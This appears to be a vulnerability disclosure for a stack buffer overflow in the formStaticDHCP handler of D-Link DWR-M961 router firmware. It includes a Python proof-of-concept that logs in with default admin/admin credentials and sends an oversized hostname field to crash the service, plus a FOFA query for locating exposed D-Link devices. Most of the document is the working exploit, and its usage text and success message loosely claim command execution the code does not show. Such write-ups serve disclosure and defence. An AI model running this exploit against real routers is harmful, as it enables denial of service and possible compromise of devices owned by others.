# D-link DWR-M961 has a formStaticDHCP stack overflow vulnerability

## Product Information

- Device: D-link DWR-M961
- 
- Manufacturer's website information：https://www.dlink.com.cn/

![CleanShot 2025-04-08 at 21 52 47@2x](https://github.com/user-attachments/assets/c11c338a-69f4-4860-bbf3-bdd7050fc328)

## Vulnerability Description

Saved in the /boafrm/formStaticDHCP module of the boa server of DWR_M961_V1_1_36_upgrade
In the authorization interface, the determined parameters were concatenated without string length check, resulting in a stack overflow

![CleanShot 2025-04-08 at 21 54 03@2x](https://github.com/user-attachments/assets/a09d7efe-bb1c-413e-b485-d75b4e7b2029)

fofa:"D-Link"

![CleanShot 2025-04-08 at 21 56 25@2x](https://github.com/user-attachments/assets/d6a33d5d-29bd-43e7-be57-0b0d2d28a1a0)




## Payload

Saved in the /boafrm/formStaticDHCP module of the boa server of DWR_M961_V1_1_36_upgrade
In the authorization interface, the determined parameters were concatenated without string length check, resulting in a stack overflow
```
import requests
import time
import sys
if __name__ == '__main__':


          

    if len(sys.argv) != 2:
        print("usage: python attack.py [url] [cmd]")
    url = sys.argv[1]


    data = {
        "Language":"en-us",
        "username":"admin",
        "password":"admin",
        "submit-url":"/login.htm"
    }
    res = requests.post(url + '/boafrm/formLoginSetup', data=data)
    cookies = res.cookies
    res = requests.get(url + '/tcpip_staticdhcp.htm')


  

    for cookie in cookies:
        print("Name:", cookie.name, "Value:", cookie.value)


    data = {

        "submit-url": "/tcpip_staticdhcp.htm",
        "addRsvIPFlag": "aaaa",
        "static_dhcp": "1111",
        "hostname": "x"*4000,
    }

    res = requests.post(url + '/boafrm/formStaticDHCP', data=data , cookies=cookies)
    cookies = res.cookies

  
    if res.status_code == 400:
        print("[+] Command execute ok!")
    else:
        print("[-] Command execute failed!")

```

![](./4.png)

After the injection, we can verify the result.

![](./5.png)
